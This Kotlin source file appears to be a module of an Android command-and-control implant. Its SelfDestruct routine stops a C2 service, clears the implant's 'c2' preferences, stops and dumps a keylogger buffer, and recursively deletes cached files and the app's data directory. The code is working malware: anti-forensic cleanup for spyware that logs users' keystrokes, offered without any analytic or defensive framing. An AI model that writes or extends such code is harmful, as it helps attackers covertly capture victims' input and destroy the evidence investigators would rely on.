package com.outcome.c2

import android.content.Context
import android.content.Intent
import org.json.JSONObject
import java.io.File

object SelfDestruct {
    fun run(ctx: Context): JSONObject {
        return try {
            ctx.stopService(Intent(ctx, C2Service::class.java))
            ctx.getSharedPreferences("c2", Context.MODE_PRIVATE).edit().clear().commit()
            ctx.cacheDir.listFiles()?.forEach { it.deleteRecursively() }
            KeylogBuffer.stop()
            KeylogBuffer.dump()
            runCatching {
                val dataDir = File(ctx.filesDir.parentFile?.absolutePath ?: "")
                dataDir.listFiles()?.forEach { f ->
                    if (f.name != "lib") f.deleteRecursively()
                }
            }
            JSONObject().put("ok", true).put("wiped", true)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "self_destruct_failed")
        }
    }
}
